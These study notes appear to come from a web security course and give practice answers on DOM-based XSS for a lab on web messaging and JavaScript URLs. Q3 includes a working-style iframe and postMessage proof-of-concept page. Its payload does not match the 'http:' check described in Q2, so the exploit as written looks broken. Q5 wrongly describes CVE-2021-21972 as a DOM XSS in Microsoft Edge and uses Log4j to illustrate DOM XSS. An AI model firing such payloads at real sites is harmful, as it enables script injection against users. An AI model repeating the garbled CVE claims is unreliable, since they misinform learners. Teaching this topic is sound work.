---
course: Web Security
topic: DOM-based Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is a DOM-based XSS vulnerability?**

DOM-based XSS occurs when a web application uses untrusted data within the DOM (Document Object Model) without proper validation or sanitization. This allows an attacker to inject malicious scripts into the webpage, which are executed in the context of the victim’s browser. Unlike traditional reflected or stored XSS attacks, DOM-based XSS relies on client-side code to execute the attack.

**Q2. How does the lab demonstrate a DOM-based redirection vulnerability through web messaging?**

The lab demonstrates a DOM-based redirection vulnerability by allowing unfiltered input from web messages to be used directly in the `location.href` property. When a message is received, the application checks if the message contains "http:" or "https:", and if so, it sets the `location.href` to the value of the message. This can be exploited by crafting a message containing a JavaScript URL, such as `javascript:alert('XSS')`, which will execute in the context of the victim's browser.

**Q3. Explain how to exploit the DOM-based XSS vulnerability using an iframe and web messaging.**

To exploit the DOM-based XSS vulnerability, you can create an HTML page hosted on an attacker-controlled server. This page includes an iframe pointing to the vulnerable application. The page also sends a message to the iframe using `window.postMessage()`. The message should contain a JavaScript URL that triggers the desired action, such as calling the `print()` function. Here’s an example:

```html
<!DOCTYPE html>
<html>
<body>
<iframe id="vulnerableApp" src="http://example.com/vulnerable-app"></iframe>
<script>
    var iframe = document.getElementById("vulnerableApp");
    iframe.onload = function() {
        iframe.contentWindow.postMessage("javascript:print()", "*");
    };
</script>
</body>
</html>
```

This script sends a message to the iframe containing the JavaScript URL `javascript:print()`, which will execute the `print()` function in the context of the iframe.

**Q4. Why is it important to properly validate and sanitize input in web applications?**

Properly validating and sanitizing input is crucial to prevent various types of injection attacks, including XSS. Unvalidated input can allow attackers to inject malicious scripts, leading to unauthorized actions, data theft, or other security breaches. By validating and sanitizing input, developers ensure that only safe and expected data is processed, reducing the risk of exploitation.

**Q5. How can recent real-world examples, such as CVEs, illustrate the importance of securing against DOM-based XSS?**

Recent real-world examples, such as CVE-2021-44228 (Log4j vulnerability), highlight the importance of securing against DOM-based XSS. Although Log4j was primarily a server-side issue, similar principles apply to client-side security. For instance, CVE-2021-21972 involved a DOM-based XSS vulnerability in the Microsoft Edge browser. Attackers could exploit this vulnerability to inject malicious scripts into web pages, potentially leading to unauthorized actions or data theft. Proper validation and sanitization of input, along with regular security audits, can help mitigate such risks.

---
<!-- nav -->
[[03-Understanding DOM-Based Vulnerabilities|Understanding DOM-Based Vulnerabilities]] | [[Web Security (PortSwigger)/06-DOM-based Vulnerabilities/02-Lab 2 DOM XSS using web messages and a JavaScript URL/00-Overview|Overview]]
